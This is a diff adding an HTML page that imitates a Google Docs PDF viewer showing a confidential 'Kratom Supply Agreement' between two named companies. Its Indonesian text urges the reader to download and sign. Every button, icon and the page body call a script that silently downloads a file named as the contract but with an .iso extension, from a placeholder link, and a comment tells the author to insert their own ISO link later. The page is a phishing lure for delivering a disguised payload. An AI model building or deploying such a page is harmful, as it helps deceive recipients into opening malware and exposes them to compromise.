@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html>
+<head>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+<style>
+  html, body { margin: 0; padding: 0; height: 100%; width: 100%; background-color: #323639; font-family: 'Roboto', Arial, sans-serif; overflow: hidden; }
+  .container { display: flex; flex-direction: column; height: 100vh; width: 100vw; }
+  .top-bar { height: 56px; background: #202124; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; color: white; border-bottom: 1px solid #3c4043; flex-shrink: 0; }
+  .file-name { display: flex; align-items: center; font-size: 14px; }
+  .pdf-icon-small { color: #ea4335; margin-right: 12px; font-size: 18px; }
+  .actions { display: flex; align-items: center; gap: 20px; }
+  .btn-blue { background: #1a73e8; color: white; padding: 8px 16px; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; border: none; }
+  .icon-btn { color: white; font-size: 18px; cursor: pointer; opacity: 0.8; }
+  .toolbar { height: 48px; background: #323639; display: flex; align-items: center; justify-content: center; gap: 25px; color: white; font-size: 13px; box-shadow: 0 1px 3px rgba(0,0,0,0.5); flex-shrink: 0; }
+  .viewer-container { display: flex; flex: 1; overflow: hidden; }
+  .thumbnails { width: 180px; background: #323639; border-right: 1px solid #444; padding: 20px 10px; overflow-y: auto; display: flex; flex-direction: column; gap: 15px; align-items: center; }
+  .pdf-content { flex: 1; background: #525659; overflow-y: auto; padding: 30px; display: flex; flex-direction: column; align-items: center; }
+  .page-canvas { width: 90%; max-width: 800px; background: white; box-shadow: 0 0 15px rgba(0,0,0,0.5); padding: 60px; box-sizing: border-box; min-height: 1000px; cursor: pointer; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="top-bar">
+    <div class="file-name">
+      <i class="fas fa-file-pdf pdf-icon-small"></i>
+      <span>Heki Company Contract (2).pdf</span>
+    </div>
+    <div class="actions">
+      <i class="fas fa-download icon-btn" onclick="trigger()"></i>
+      <button class="btn-blue" onclick="trigger()">Buka dengan Google Dokumen</button>
+      <i class="fas fa-print icon-btn"></i>
+    </div>
+  </div>
+  <div class="toolbar"><span>Halaman 1 / 3</span><div style="height: 20px; width: 1px; background: #555;"></div><i class="fas fa-minus"></i><span>100%</span><i class="fas fa-plus"></i></div>
+  <div class="viewer-container">
+    <div class="thumbnails">
+      <div style="width:120px; height:160px; background:white; border:2px solid #8ab4f8;"></div>
+      <span style="color:white; font-size:11px;">1</span>
+      <div style="width:120px; height:160px; background:white; opacity:0.3;"></div>
+      <span style="color:white; font-size:11px;">2</span>
+    </div>
+    <div class="pdf-content" onclick="trigger()">
+      <div class="page-canvas">
+        <h2 style="text-align:center;">KRATOM SUPPLY AGREEMENT</h2>
+        <p style="margin-top:40px;">Dokumen ini bersifat rahasia dan berisi rincian kontrak antara PT Kalamantha Embara Buana dengan Phylochem (Pvt) Ltd untuk wilayah Pontianak.</p>
+        <p style="margin-top:20px; color:#666;">Silakan klik tombol unduh untuk melihat draf lengkap dan menandatangani secara digital.</p>
+      </div>
+    </div>
+  </div>
+</div>
+<script>
+  function trigger() {
+    // Ganti dengan link file ISO kamu nanti
+    const url = "https://link-file-kamu.com/kontrak.iso";
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = "Heki_Company_Contract.iso";
+    document.body.appendChild(a);
+    a.click();
+    document.body.removeChild(a);
+  }
+</script>
+</body>
+</html>
